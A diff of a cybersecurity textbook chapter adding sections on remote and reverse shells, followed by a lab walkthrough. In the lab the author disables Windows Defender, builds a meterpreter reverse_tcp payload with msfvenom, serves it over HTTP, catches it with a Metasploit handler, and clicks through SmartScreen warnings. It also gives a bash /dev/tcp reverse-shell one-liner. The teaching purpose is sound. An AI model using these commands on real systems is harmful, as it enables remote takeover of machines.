@@ -124,7 +124,7 @@ Victims communicate with frameworks using an *agent* that has been installed on 
 ![[../images/10/c2_agents.png|C2 Agent Communication Flow|550]]
 
 When the attacker is ready to have a victim or group of victims perform some task, such as a *distributed denial of service (DDoS)* attack, they log into the framework C2 and insert a command.  When the agents eventually check in, they see the command and execute it.  After the victim executes the command, the results are returned to the C2 and then the querying recommences.  In the next section we will explore shells and *reverse shells* that work similarly to agents.
-## Remote Shells
+## Shells
 The interface where a user can enter commands to a computer is often referred to as a shell, terminal, console, and command line interface although technically each of these terms have a distinguished meaning.  While it is common to use them interchangeably, as I have and will continue to in this text, it is beneficial to know their differences.  A **shell** is a computer program that provides a text only interface and is used to give the machine instructions to run other programs.  The **command line interface (CLI)**, or prompt, is part of the shell that starts with the blinking cursor where the shell user enters commands.  **Terminal** and **console** have their roots in the early days of networked computing where a device, the console, connected to a mainframe via an interface, the terminal.
 
 > [!info] Info - Shell Options
@@ -132,6 +132,7 @@ The interface where a user can enter commands to a computer is often referred to
 
 Shells offer a convenient way to interact with a computer that has low overhead relative to a GUI.  Another feature is the ability to group commands together with logic into *scripts* which can automate tasks improving quality and efficacy.  Another profound capability of shells is that they can be used locally or remotely.  This can empower administrators and system users to connect to a device from anywhere over the internet as if they were sitting in front of it.  However, before a remote shell connection can be made, the remote device must be appropriately configured with a shell program that interacts with the networking stack.  Once the needed software and running the program runs as a service and is bound to a network port awaiting incoming connections.  
 
+### Remote Shells
 The security of remote shells is very important since it effectively turns the remote device into a server that can be connected to and controlled by anonymous users on a network.  The most basic forms of security for remote shells are authentication, such as requiring a username and password before admitting a shell connection, and encryption, where the network traffic is protected from manipulation and eavesdropping.  Advanced security measures ensure accounts making remote shell connections are authorized with least privileges even through the use of a *restricted shell* or *jail* which limit the commands that can be used.  
 
 > [!warning] Warning - Using Non-Default Remote Management Ports for Security
@@ -187,12 +188,96 @@ A common remote shell protocol and application is Telnet which is still used tod
 >```
 >![[../images/10/ssh_activity_remote_commands.png|Remote Commands From Kali On Ubuntu|600]]
 
-Hardened Network
-programs that allow reverse shells
-Reverse Shell
+### Reverse Shells
+Most networks and devices are protected with firewalls that effectively close any open ports and block services, unless purposefully opened.  Doing so prevents remote management services like SSH or Telnet from being exposed to the network or the internet.  However, devices within a protected network are still able to reach out to internet resources, assuming that the firewalls being used don't block outbound connections.  Most firewalls and routers will block all inbound ports and allow any outbound connections by default.  The following diagram demonstrates the blocking of inbound connections from the internet while allowing network devices to reach internet resources.
+![[../images/10/reverse_shell.png|Hardened Network|300]]
+Building on the topic of remote shells, where a remote user can connect to another device using a shell program, a **reverse shell** establishes a connection generated from the remote system to the user's system - opposite of a remote shell.  This method of connection is popular among malicious actors for a few reasons.  Many times a victim device does not have a remote management protocol, such as SSH or WinRM, enabled.  In order for the attacker to achieve a remote terminal connection they setup a server, or listener, and have the remote victim device connect to the attacker.  Illustrating this connection method in the following diagram, the client connects to the attacker.
+
+![[../images/10/reverse_shell_connection.png|Victim Reverse Shell Connection|300]]
+
+There are several native technologies that an attacker can leverage on a victim device, called *living off the land binaries (LOLBINS)*.  For example, bash can establish a remote shell using the following command `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` where `10.0.0.1` is the remote server and `8080` is the port being connected to.  Almost any scripting language can create arbitrary outbound connections so there are many reverse shells *one-liners* like the bash command above.  PentestMonkey's Reverse Shell Cheat Sheet (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) lists several programs that can be used to generate such connections.  A reverse shell can be achieved on a victim device if the attacker can run *remote code execution (RCE)* exploits, arbitrary commands, or if they are able to get the victim user to run malicious software, such as a *trojan*.  
+
 > [!activity] Activity 10.3 - Reverse Shell
+> Metasploit comes with a utility called Msfvenom that is used to generate payloads, or executables, that will establish a connection to a Metasploit listener running on an attacker's machine.  You could imagine the Msfvenom payloads are reverse shell executables that could be sent to a victim user in a phishing email or by some other method.  I will demonstrate how to generate an Msfvenom payload, setup a Metasploit listener, and simulate a victim's execution of the malware using the Windows and Kali VMs.  It is important both machines are on the same network as they will need to connect with each other.
+> 
+>  Windows Defender will quickly identify the Msfvenom payload as malware so I will disable the antivirus for the sake of the demonstration.  Note that there are several methods to bypass antivirus that exceeds the scope of this demonstration.  After starting the Windows VM, I navigate to the "Virus & threat protection" system settings using the search menu.
+>  ![[../images/10/rev_activity_av.png|Launching Windows Defender Settings|500]]
+>  Then I press "Manage settings" under the Virus & threat protection settings section to launch the setting options window.
+>  ![[../images/10/rev_activity_settings.png|Defender Manage Settings|450]]
+>  With the Settings window launched, I flip the "Real-time protection" setting to disable.  This will turn Defender off and prevent the blocking of the Msfvenom payload used later.
+>  ![[../images/10/rev_activity_disabled.png|Disabled Windows Defender|450]]
+>  Jumping over to the Kali VM and launching a terminal, I check Kali's IP address using the IP command.  The Kali IP address 192.168.4.167 will be needed to configure the Msfvenom payload.
+>  ```bash
+>  ip a
+>  ```
+>  ![[../images/10/rev_activity_ip.png|Kali IP Address|600]]
+>  Msfvenom comes preinstalled in Kali so it is ready to use.  Running the following command lists the hundreds of supported payloads.  It takes a moment to run but displays various shell, command, and system options.  
+>  ```bash
+>  msfvenom --list payloads
+>  ```
+>  ![[../images/10/rev_activity_payloads.png|Msfvenom Payload Options|600]]
+>  Some of these payloads are bind shells while others are reverse shells.  A bind shell is a program that turns the victim into a server with a listening port and service for the attacker to connect to.  Another distinguishing option is the staged versus stageless.  Staged payloads use the syntax `type_method_protocol` while stageless have the syntax `type/method_protocol`.  Notice the slight variation of two underscores versus one.  A staged payload is smaller that will download a second temporary executable and run it.  The stageless payloads are larger and perform all actions in one execution.  The last payload option to consider is a shell versus a meterpreter.  A shell can be used with any listener, such as Netcat, and is light weight.  Whereas a meterpreter payload is designed with Metasploit and comes with many extended features such as upload/download and privilege escalation built-in commands.   
+>  
+>  Because I will be targeting a Windows 64 bit system that creates a reverse shell, I select the `windows/x64/meterpreter/reverse_tcp` payload to use in my Msfvenom generation.  I must also specify the listening host (192.168.4.167) and port (9001), executable filetype (exe) and the output file (runme.exe).  The following command creates the Msfvenom payload in my current folder.
+>  ```bash
+>  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.4.167 LPORT=9001 -f exe -o runme.exe
+>  ```
+>  ![[../images/10/rev_activity_msfvenom.png|Payload Generated On Kali|600]]
+>  I will need the victim to download this executable so I setup a Python HTTP webserver using the following command.
+>  ```bash
+>  python3 -m http.server 80
+>  ```
+>  ![[../images/10/rev_activity_webserver.png|Python Web Server To Deliver Payload|600]]
+>  But before I have the victim download the file I need to setup Metasploit to catch the reverse shell.  I launch another terminal in the Kali VM and run the following command to start Metasploit.
+>  ```bash
+>  sudo msfdb run
+>  ```
+>  ![[../images/10/rev_activity_start_msf.png|Starting Metasploit|600]]
+>  Once Metasploit is started I load the multi handler module which will be used to start a listener.
+>  ```bash
+>  use exploit/multi/handler
+>  ```
+>  ![[../images/10/rev_activity_load_handler.png|Load Multi-Handler Module In Metasploit|600]]
+>  Notice the information message that the `generic/shell_reverse_tcp` payload was automatically selected.  This does not match the payload that I already created using Msfvenom.  So I set the correct payload with the following command.
+>  ```
+>  set payload windows/x64/meterpreter/reverse_tcp
+>  ```
+>  ![[../images/10/rev_activity_payload_set.png|Setting Windows Payload In Multi-Handler|600]]
+>  With the correct payload set I need to configure its listening host and port to match the Msfvenom payload attributes used earlier.
+>  ```
+>  set LHOST 192.168.4.167
+>  set LPORT 9001
+>  ```
+>  ![[../images/10/rev_activity_configure_listener.png|Configuring Listener|600]]
+>  The last step for setting up the listener is to run it with either the run or the exploit command.
+>  ```
+>  run
+>  ```
+>  ![[../images/10/rev_activity_run_listener.png|Run Configured Multi-Handler|600]]
+>  With the Msfvenom payload executable generated, HTTP server ready to serve it, and the Metasploit multi handler listener running, I am ready to spring the attack on the victim.  Jumping back to the Windows VM and pretending to be the victim, I open a browser and navigate to `192.168.4.167` to see the files being served by the attacker.  I press the `runme.exe` file to start the download.
+>  ![[../images/10/rev_activity_files.png|Victim Payload Download|600]]
+>  Microsoft Edge immediately detects that the file is an executable and blocks the download.  To overcome this I tell Edge to keep the file regardless.
+>  ![[../images/10/rev_activity_edge_bypass.png|Bypassing Edge Warning]]
+>  As soon as I press the Keep option, Microsoft SmartScreen identifies that the downloaded executable has not been signed with a reputable certificate.  I tell SmartScreen to "Keep anyway" under the "Show more" dropdown to complete the download.
+>  ![[../images/10/rev_activity_smartscreen_1.png|Edge SmartScreen Warning|300]]
+>  Finally the runme.exe file is in my downloads folder.
+>  ![[../images/10/rev_activity_downloaded.png|Runme.exe In Downloads Folder|300]]
+>  Double clicking the file immediately triggers another SmartScreen warning, this time because the executable has the "mark of the web" in its properties.  Clearly, Microsoft has learned about this attack vector and has put many obstacles in place to prevent a user from running malicious software from the internet!
+>  ![[../images/10/rev_activity_smartscreen_2.png|SmartScreen Block At Running|400]]
+>  I press the "More info" link which enables the "Run Anyway" button at the bottom of the Window.  Pressing this button will trigger the reverse shell connection.  You might be wondering how practical such an attack would be given all the security warnings implemented by Microsoft.  Each of these have multiple bypasses that could be deployed while some could be avoided altogether.  Such bypasses exceed the scope of this activity and interested readers are encouraged to research on their own.
+>  
+>  After hitting Run Anyway, nothing really happens on the Windows VM.  However, jumping back to Kali's Metasploit listener I see an connection was made.  The attacker now has remote control of this Windows victim through a meterpreter reverse shell!
+>  ![[../images/10/rev_activity_connection.png|Meterpreter Reverse Shell Connection|600]]
+>  The terminal changes from msf6 to meterpreter indicating a new command line.  Running the help menu displays all the meterpreter commands available.  There are many interesting commands listed.
+>  ![[../images/10/rev_activity_help.png|Meterpreter Help Menu|600]]
+>  The session could terminate unexpectedly in which case the listener would have to be restarted and the victim re-execute the runme.exe file.  To validate the connection I run the system information command which gives me details on the victim's operating system.
+>  ```
+>  sysinfo
+>  ```
+>  ![[../images/10/rev_activity_sysinfo.png|Meterpreter Sysinfo Command Results|600]]
+>  There are many other meterpreter features worth exploring, some of which will be covered in a later activity.
 
-
+One method to block outbound reverse shell connections within a network is to constrain egressed sockets allowed.  Many secure networks won't have access to the internet or are only allowed to connect to DNS and HTTP services over ports 53 and 80/443 respectively.  While this will thwart any reverse shells trying to connect on any other port, many attackers will use DNS or HTTP ports to bypass these network limitations.  Therefore, advanced next generation firewalls with port and protocol mismatch detection should be enforced that will monitor outbound connections over these allowed ports to validate they adhere to the protocol.  If the firewall detects a non-HTTP compliant connection over port 80 it will alert or block that traffic.  In response, attackers may use HTTP reverse shells or C2 agents like the ones available in Covenant. 
 ## Red Team Process
 Reconnaissance
 Enumeration
